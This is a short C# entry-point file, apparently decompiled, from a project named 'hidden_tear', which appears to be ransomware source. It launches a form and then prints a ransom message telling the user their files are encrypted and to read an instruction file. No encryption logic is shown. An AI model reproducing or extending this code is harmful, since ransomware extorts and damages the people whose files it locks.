using System;
using System.Windows.Forms;

namespace hidden_tear;

internal static class Program
{
	[STAThread]
	private static void Main(string[] args)
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new Form1());
		Console.WriteLine("Your files are encrypted. Read the instruction.txt file on your desktop to recover files.");
		Console.ReadKey();
	}
}
